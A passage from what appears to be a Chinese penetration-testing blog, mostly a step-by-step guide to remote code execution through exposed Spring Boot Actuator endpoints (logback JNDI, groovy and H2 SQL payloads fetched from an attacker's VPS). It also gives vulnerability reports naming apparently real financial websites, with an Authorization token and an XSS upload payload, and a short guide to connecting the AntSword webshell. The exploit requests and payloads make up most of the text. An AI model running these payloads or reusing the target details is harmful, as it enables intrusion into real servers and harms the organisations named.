title="步骤四：刷新配置"></a>步骤四：刷新配置</h5><p>spring 1.x</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">POST</span> /refresh<br>Content-<span class="hljs-keyword">Type</span>: application/x-www-<span class="hljs-keyword">form</span>-urlencoded<br></code></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">POST /actuator/<span class="hljs-keyword">refresh</span><br>Content-<span class="hljs-keyword">Type</span>: application/<span class="hljs-type">json</span><br></code></pre></td></tr></table></figure><h5 id="步骤五：触发数据库查询"><a href="#步骤五：触发数据库查询" class="headerlink" title="步骤五：触发数据库查询"></a>步骤五：触发数据库查询</h5><p>尝试访问网站已知的数据库查询的接口，例如： <code>/product/list</code> ，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发</p><h5 id="步骤六：恢复正常-jdbc-url"><a href="#步骤六：恢复正常-jdbc-url" class="headerlink" title="步骤六：恢复正常 jdbc url"></a>步骤六：恢复正常 jdbc url</h5><p>反序列化漏洞利用完成后，使用 <strong>步骤三</strong> 的方法恢复 <strong>步骤一</strong> 中记录的 <code>spring.datasource.url</code> 的原始 <code>value</code> 值</p><h3 id="3-9-restart-logging-config-logback-JNDI-RCE"><a href="#3-9-restart-logging-config-logback-JNDI-RCE" class="headerlink" title="3.9 restart logging.config logback JNDI RCE"></a>3.9 restart logging.config logback JNDI RCE</h3><h4 id="利用条件：-12"><a href="#利用条件：-12" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li><li>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201&#x2F;7u191&#x2F;8u182&#x2F;11.0.1(LDAP)，但相关环境可绕过</li><li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li><li>⚠️ HTTP 服务器如果返回含有畸形 xml 语法内容的文件，会导致程序异常退出</li><li>⚠️ JNDI 服务返回的 object 需要实现 <code>javax.naming.spi.ObjectFactory</code> 接口，否则会导致程序异常退出</li></ul><h4 id="漏洞原理：-8"><a href="#漏洞原理：-8" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol><li>目标机器通过 logging.config 属性设置 logback 日志配置文件 URL 地址</li><li>restart 重启应用后，程序会请求 URL 地址获得恶意 xml 文件内容</li><li>目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)</li><li>xml 文件中利用 <code>logback</code> 依赖的 <code>insertFormJNDI</code> 标签，设置了外部 JNDI 服务器地址</li><li>目标机器请求恶意 JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞</li></ol><h4 id="利用方法：-12"><a href="#利用方法：-12" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：托管-xml-文件"><a href="#步骤一：托管-xml-文件" class="headerlink" title="步骤一：托管 xml 文件"></a>步骤一：托管 xml 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用 python 快速开启 http server</span><br><br>python2 -m SimpleHTTPServer 80<br>python3 -m http.server 80<br></code></pre></td></tr></table></figure><p>在根目录放置以 <code>xml</code> 结尾的 <code>example.xml</code> 文件，实际内容要根据步骤二中使用的 JNDI 服务来确定：</p><p>xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">insertFromJNDI</span> <span class="hljs-attr">env-entry-name</span>=<span class="hljs-string">&quot;ldap://your-vps-ip:1389/TomcatBypass/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9y&quot;</span> <span class="hljs-attr">as</span>=<span class="hljs-string">&quot;appName&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="步骤二：托管恶意-ldap-服务及代码"><a href="#步骤二：托管恶意-ldap-服务及代码" class="headerlink" title="步骤二：托管恶意 ldap 服务及代码"></a>步骤二：托管恶意 ldap 服务及代码</h5><p>参考<a href="https://landgrey.me/blog/21/">文章</a>，修改 <a href="https://github.com/feihong-cs/JNDIExploit">JNDIExploit</a> 并启动（也可以使用其他方法）：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar JNDIExploit-1.0-SNAPSHOT.jar -i your-vps-ip<br></code></pre></td></tr></table></figure><h5 id="步骤三：设置-logging-config-属性"><a href="#步骤三：设置-logging-config-属性" class="headerlink" title="步骤三：设置 logging.config 属性"></a>步骤三：设置 logging.config 属性</h5><p>spring 1.x</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">POST</span> /env<br>Content-<span class="hljs-keyword">Type</span>: application/x-www-<span class="hljs-keyword">form</span>-urlencoded<br><br>logging.config=http:<span class="hljs-comment">//your-vps-ip/example.xml</span><br></code></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nix">POST <span class="hljs-symbol">/actuator/env</span><br><span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/json</span><br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;logging.config&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>:<span class="hljs-string">&quot;http://your-vps-ip/example.xml&quot;</span>&#125;<br></code></pre></td></tr></table></figure><h5 id="步骤四：重启应用"><a href="#步骤四：重启应用" class="headerlink" title="步骤四：重启应用"></a>步骤四：重启应用</h5><p>spring 1.x</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">POST</span> /restart<br>Content-<span class="hljs-keyword">Type</span>: application/x-www-<span class="hljs-keyword">form</span>-urlencoded<br></code></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">POST /actuator/<span class="hljs-keyword">restart</span><br>Content-<span class="hljs-keyword">Type</span>: application/<span class="hljs-type">json</span><br></code></pre></td></tr></table></figure><h3 id="3-10-restart-logging-config-groovy-RCE"><a href="#3-10-restart-logging-config-groovy-RCE" class="headerlink" title="3.10 restart logging.config groovy RCE"></a>3.10 restart logging.config groovy RCE</h3><h4 id="利用条件：-13"><a href="#利用条件：-13" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li><li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li><li>⚠️ HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出</li><li>⚠️ 环境中需要存在 groovy 依赖，否则会导致程序异常退出</li></ul><p>**Groovy：**一种可选的Java虚拟机（JVM）语言，它提供了类似于Python、Ruby和Smalltalk的语法，同时保持了与Java的互操作性。Groovy常用于编写脚本和简化Java开发。</p><h4 id="漏洞原理：-9"><a href="#漏洞原理：-9" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol><li>目标机器通过 logging.config 属性设置 logback 日志配置文件 URL 地址</li><li>restart 重启应用后，程序会请求设置的 URL 地址</li><li><code>logback-classic</code> 组件的 <code>ch.qos.logback.classic.util.ContextInitializer.java</code> 代码文件逻辑中会判断 url 是否以 <code>groovy</code> 结尾</li><li>如果 url 以 <code>groovy</code> 结尾，则最终会执行文件内容中的 groovy 代码，造成 RCE 漏洞</li></ol><h4 id="利用方法：-13"><a href="#利用方法：-13" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：托管-groovy-文件"><a href="#步骤一：托管-groovy-文件" class="headerlink" title="步骤一：托管 groovy 文件"></a>步骤一：托管 groovy 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用 python 快速开启 http server</span><br><br>python2 -m SimpleHTTPServer 80<br>python3 -m http.server 80<br></code></pre></td></tr></table></figure><p>在根目录放置以 <code>groovy</code> 结尾的 <code>example.groovy</code> 文件，内容为需要执行的 groovy 代码，比如：</p><p>xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">Runtime.getRuntime().exec(&quot;open -a Calculator&quot;)<br></code></pre></td></tr></table></figure><h5 id="步骤二：设置-logging-config-属性"><a href="#步骤二：设置-logging-config-属性" class="headerlink" title="步骤二：设置 logging.config 属性"></a>步骤二：设置 logging.config 属性</h5><p>spring 1.x</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">POST</span> /env<br>Content-<span class="hljs-keyword">Type</span>: application/x-www-<span class="hljs-keyword">form</span>-urlencoded<br><br>logging.config=http:<span class="hljs-comment">//your-vps-ip/example.groovy</span><br></code></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nix">POST <span class="hljs-symbol">/actuator/env</span><br><span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/json</span><br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;logging.config&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>:<span class="hljs-string">&quot;http://your-vps-ip/example.groovy&quot;</span>&#125;<br></code></pre></td></tr></table></figure><h5 id="步骤三：重启应用"><a href="#步骤三：重启应用" class="headerlink" title="步骤三：重启应用"></a>步骤三：重启应用</h5><p>spring 1.x</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">POST</span> /restart<br>Content-<span class="hljs-keyword">Type</span>: application/x-www-<span class="hljs-keyword">form</span>-urlencoded<br></code></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">POST /actuator/<span class="hljs-keyword">restart</span><br>Content-<span class="hljs-keyword">Type</span>: application/<span class="hljs-type">json</span><br></code></pre></td></tr></table></figure><h3 id="3-11-restart-spring-main-sources-groovy-RCE"><a href="#3-11-restart-spring-main-sources-groovy-RCE" class="headerlink" title="3.11 restart spring.main.sources groovy RCE"></a>3.11 restart spring.main.sources groovy RCE</h3><h4 id="利用条件：-14"><a href="#利用条件：-14" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li><li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li><li>⚠️ HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出</li><li>⚠️ 环境中需要存在 groovy 依赖，否则会导致程序异常退出</li></ul><h4 id="漏洞原理：-10"><a href="#漏洞原理：-10" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol><li>目标机器可以通过 spring.main.sources 属性来设置创建 ApplicationContext 的额外源的 URL 地址</li><li>restart 重启应用后，程序会请求设置的 URL 地址</li><li><code>spring-boot</code> 组件中的 <code>org.springframework.boot.BeanDefinitionLoader.java</code> 文件代码逻辑中会判断 url 是否以 <code>.groovy</code> 结尾</li><li>如果 url 以 <code>.groovy</code> 结尾，则最终会执行文件内容中的 groovy 代码，造成 RCE 漏洞</li></ol><h4 id="利用方法：-14"><a href="#利用方法：-14" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：托管-groovy-文件-1"><a href="#步骤一：托管-groovy-文件-1" class="headerlink" title="步骤一：托管 groovy 文件"></a>步骤一：托管 groovy 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用 python 快速开启 http server</span><br><br>python2 -m SimpleHTTPServer 80<br>python3 -m http.server 80<br></code></pre></td></tr></table></figure><p>在根目录放置以 <code>groovy</code> 结尾的 <code>example.groovy</code> 文件，内容为需要执行的 groovy 代码，比如：</p><p>xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">Runtime.getRuntime().exec(&quot;open -a Calculator&quot;)<br></code></pre></td></tr></table></figure><h5 id="步骤二：设置-spring-main-sources-属性"><a href="#步骤二：设置-spring-main-sources-属性" class="headerlink" title="步骤二：设置 spring.main.sources 属性"></a>步骤二：设置 spring.main.sources 属性</h5><p>spring 1.x</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">POST</span> /env<br>Content-<span class="hljs-keyword">Type</span>: application/x-www-<span class="hljs-keyword">form</span>-urlencoded<br><br>spring.main.sources=http:<span class="hljs-comment">//your-vps-ip/example.groovy</span><br></code></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nix">POST <span class="hljs-symbol">/actuator/env</span><br><span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/json</span><br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;spring.main.sources&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>:<span class="hljs-string">&quot;http://your-vps-ip/example.groovy&quot;</span>&#125;<br></code></pre></td></tr></table></figure><h5 id="步骤三：重启应用-1"><a href="#步骤三：重启应用-1" class="headerlink" title="步骤三：重启应用"></a>步骤三：重启应用</h5><p>spring 1.x</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">POST</span> /restart<br>Content-<span class="hljs-keyword">Type</span>: application/x-www-<span class="hljs-keyword">form</span>-urlencoded<br></code></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">POST /actuator/<span class="hljs-keyword">restart</span><br>Content-<span class="hljs-keyword">Type</span>: application/<span class="hljs-type">json</span><br></code></pre></td></tr></table></figure><h3 id="3-12-restart-spring-datasource-data-h2-database-RCE"><a href="#3-12-restart-spring-datasource-data-h2-database-RCE" class="headerlink" title="3.12 restart spring.datasource.data h2 database RCE"></a>3.12 restart spring.datasource.data h2 database RCE</h3><h4 id="利用条件：-15"><a href="#利用条件：-15" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li><li>环境中需要存在 <code>h2database</code>、<code>spring-boot-starter-data-jpa</code> 相关依赖</li><li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li><li>⚠️ HTTP 服务器如果返回含有畸形 h2 sql 语法内容的文件，会导致程序异常退出</li></ul><h4 id="漏洞原理：-11"><a href="#漏洞原理：-11" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol><li>目标机器可以通过 spring.datasource.data 属性来设置 jdbc DML sql 文件的 URL 地址</li><li>restart 重启应用后，程序会请求设置的 URL 地址</li><li><code>spring-boot-autoconfigure</code> 组件中的 <code>org.springframework.boot.autoconfigure.jdbc.DataSourceInitializer.java</code> 文件代码逻辑中会使用 <code>runScripts</code> 方法执行请求 URL 内容中的 h2 database sql 代码，造成 RCE 漏洞</li></ol><h4 id="利用方法：-15"><a href="#利用方法：-15" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：托管-sql-文件"><a href="#步骤一：托管-sql-文件" class="headerlink" title="步骤一：托管 sql 文件"></a>步骤一：托管 sql 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用 python 快速开启 http server</span><br><br>python2 -m SimpleHTTPServer 80<br>python3 -m http.server 80<br></code></pre></td></tr></table></figure><p>在根目录放置以任意名字的文件，内容为需要执行的 h2 sql 代码，比如：</p><blockquote><p>⚠️ 下面payload 中的 ‘T5’ 方法只能 restart 执行一次；后面 restart 需要更换新的方法名称 (如 T6) 和设置新的 sql URL 地址，然后才能被 restart 重新使用，否则第二次 restart 重启应用时会导致程序异常退出</p></blockquote><p>xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">CREATE ALIAS T5 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T5(&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,&#x27;open -a Calculator&#x27;);<br></code></pre></td></tr></table></figure><h5 id="步骤二：设置-spring-datasource-data-属性"><a href="#步骤二：设置-spring-datasource-data-属性" class="headerlink" title="步骤二：设置 spring.datasource.data 属性"></a>步骤二：设置 spring.datasource.data 属性</h5><p>spring 1.x</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">POST</span> /env<br>Content-<span class="hljs-keyword">Type</span>: application/x-www-<span class="hljs-keyword">form</span>-urlencoded<br><br>spring.datasource.data=http:<span class="hljs-comment">//your-vps-ip/example.sql</span><br></code></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nix">POST <span class="hljs-symbol">/actuator/env</span><br><span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/json</span><br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;spring.datasource.data&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>:<span class="hljs-string">&quot;http://your-vps-ip/example.sql&quot;</span>&#125;<br></code></pre></td></tr></table></figure><h5 id="步骤三：重启应用-2"><a href="#步骤三：重启应用-2" class="headerlink" title="步骤三：重启应用"></a>步骤三：重启应用</h5><p>spring 1.x</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">POST</span> /restart<br>Content-<span class="hljs-keyword">Type</span>: application/x-www-<span class="hljs-keyword">form</span>-urlencoded<br></code></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">POST /actuator/<span class="hljs-keyword">restart</span><br>Content-<span class="hljs-keyword">Type</span>: application/<span class="hljs-type">json</span><br></code></pre></td></tr></table></figure><h2 id="swagger接口信息泄露"><a href="#swagger接口信息泄露" class="headerlink" title="swagger接口信息泄露"></a>swagger接口信息泄露</h2><p>漏洞url：<a href="https://aries.minshenglife.com/gateway/core/;/swagger-ui.html">https://aries.minshenglife.com/gateway/core/;/swagger-ui.html</a></p><p><img src="/../images/db53bc26-01a8-409d-bd48-dfc5f54d6c97.png" alt="db53bc26-01a8-409d-bd48-dfc5f54d6c97"></p><p><img src="/../images/64afae06-00dd-4932-a293-2ce853cadc1b.png" alt="64afae06-00dd-4932-a293-2ce853cadc1b"></p><p><img src="/../images/99d50d0d-2d20-4693-936e-f1928e6e86b1.png" alt="99d50d0d-2d20-4693-936e-f1928e6e86b1"></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">【漏洞地址】</span><br><span class="hljs-string">https://scrm.cpicfunds.com:443/finance/marketing/app/tools/cpicfunds/uploadImg</span><br><span class="hljs-string">【测试过程】</span><br><span class="hljs-string">添加一个任意值的Origin请求头</span><br><span class="hljs-string">POST</span> <span class="hljs-string">/finance/marketing/app/tools/cpicfunds/uploadImg</span> <span class="hljs-string">HTTP/1.1</span><br><span class="hljs-attr">Host:</span> <span class="hljs-string">scrm.cpicfunds.com</span><br><span class="hljs-attr">Content-Length:</span> <span class="hljs-number">257</span><br><span class="hljs-attr">Xweb_xhr:</span> <span class="hljs-number">1</span><br><span class="hljs-attr">Authorization:</span> <span class="hljs-string">238f8189cafc4fbf908e3d178508ad59</span><br><span class="hljs-attr">User-Agent:</span> <span class="hljs-string">Mozilla/5.0</span> <span class="hljs-string">(Windows</span> <span class="hljs-string">NT</span> <span class="hljs-number">10.0</span><span class="hljs-string">;</span> <span class="hljs-string">Win64;</span> <span class="hljs-string">x64)</span> <span class="hljs-string">AppleWebKit/537.36</span> <span class="hljs-string">(KHTML,</span> <span class="hljs-string">like</span> <span class="hljs-string">Gecko)</span> <span class="hljs-string">Chrome/126.0.0.0</span> <span class="hljs-string">Safari/537.36</span> <span class="hljs-string">MicroMessenger/7.0.20.1781(0x6700143B)</span> <span class="hljs-string">NetType/WIFI</span> <span class="hljs-string">MiniProgramEnv/Windows</span> <span class="hljs-string">WindowsWechat/WMPF</span> <span class="hljs-string">WindowsWechat(0x63090c37)XWEB/14185</span><br><span class="hljs-attr">Content-Type:</span> <span class="hljs-string">multipart/form-data;</span> <span class="hljs-string">boundary=----WebKitFormBoundaryG7xLcTn90MdeGS5T</span><br><span class="hljs-attr">Accept:</span> <span class="hljs-string">*/*</span><br><span class="hljs-attr">Sec-Fetch-Site:</span> <span class="hljs-string">cross-site</span><br><span class="hljs-attr">Sec-Fetch-Mode:</span> <span class="hljs-string">cors</span><br><span class="hljs-attr">Sec-Fetch-Dest:</span> <span class="hljs-string">empty</span><br><span class="hljs-attr">Referer:</span> <span class="hljs-string">https://servicewechat.com/wxae879adb344254a7/8/page-frame.html</span><br><span class="hljs-attr">Accept-Encoding:</span> <span class="hljs-string">gzip,</span> <span class="hljs-string">deflate,</span> <span class="hljs-string">br</span><br><span class="hljs-attr">Accept-Language:</span> <span class="hljs-string">zh-CN,zh;q=0.9</span><br><span class="hljs-attr">Priority:</span> <span class="hljs-string">u=1,</span> <span class="hljs-string">i</span><br><span class="hljs-attr">Connection:</span> <span class="hljs-string">close</span><br><span class="hljs-attr">Origin:</span> <span class="hljs-string">https://hhohe.com</span><br><br><span class="hljs-string">------WebKitFormBoundaryG7xLcTn90MdeGS5T</span><br><span class="hljs-attr">Content-Disposition:</span> <span class="hljs-string">form-data;</span> <span class="hljs-string">name=&quot;fileName&quot;</span><br><br><br><span class="hljs-string">------WebKitFormBoundaryG7xLcTn90MdeGS5T</span><br><span class="hljs-attr">Content-Disposition:</span> <span class="hljs-string">form-data;</span> <span class="hljs-string">name=&quot;files&quot;;</span> <span class="hljs-string">filename=&quot;Obito.html&quot;</span><br><span class="hljs-attr">Content-Type:</span> <span class="hljs-string">text/html</span><br><br><span class="hljs-string">&amp;lt;script&amp;gt;alert(1)&amp;lt;script&amp;gt;</span><br><span class="hljs-string">响应结果里设置了Access-Control-Allow-Credentials:</span> <span class="hljs-literal">true</span><span class="hljs-string">，且Access-Control-Allow-Origin头为任意来源</span><br><span class="hljs-string">HTTP/1.1</span> <span class="hljs-number">200</span> <span class="hljs-string">OK</span><br><span class="hljs-attr">Server:</span> <span class="hljs-string">nginx</span><br><span class="hljs-attr">Date:</span> <span class="hljs-string">Tue,</span> <span class="hljs-number">05</span> <span class="hljs-string">Aug</span> <span class="hljs-number">2025 03:38:17 </span><span class="hljs-string">GMT</span><br><span class="hljs-attr">Content-Type:</span> <span class="hljs-string">application/json</span><br><span class="hljs-attr">Connection:</span> <span class="hljs-string">close</span><br><span class="hljs-attr">Vary:</span> <span class="hljs-string">Origin</span><br><span class="hljs-attr">Access-Control-Allow-Origin:</span> <span class="hljs-string">https://hhohe.com</span><br><span class="hljs-attr">Access-Control-Allow-Credentials:</span> <span class="hljs-literal">true</span><br><span class="hljs-attr">Content-Length:</span> <span class="hljs-number">152</span><br></code></pre></td></tr></table></figure><p>fofa搜索</p><p>domain&#x3D;”fenbi.com” &amp;&amp; icon_hash&#x3D;”116323821”</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>中国蚁剑</title>
    <link href="/2025/01/08/%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91/"/>
    <url>/2025/01/08/%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91/</url>
    
    <content type="html"><![CDATA[<p>使用流程：</p><ol><li><strong>添加数据</strong>：打开蚁剑 → 点击 “添加数据”</li><li>配置连接<ul><li><strong>URL</strong>：填入包含日志的 URL（如<code>http://靶场IP/vulnerable.php?file=/var/log/nginx/access.log</code>）</li><li><strong>密码</strong>：填入<code>cmd</code>（对应木马中的<code>$_POST[&#39;cmd&#39;]</code>）</li><li><strong>编码器</strong>：选择<code>UTF-8</code></li></ul></li><li><strong>测试连接</strong>：点击 “测试连接”，成功后即可管理服务器文件、执行命令。</li></ol><p><img src="/images/%E8%9A%81%E5%89%911.png"></p><p><img src="/images/%E8%9A%81%E5%89%912.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息搜集</title>
    <link href="/2025/01/07/CTF-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <url>/2025/01/07/CTF-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    
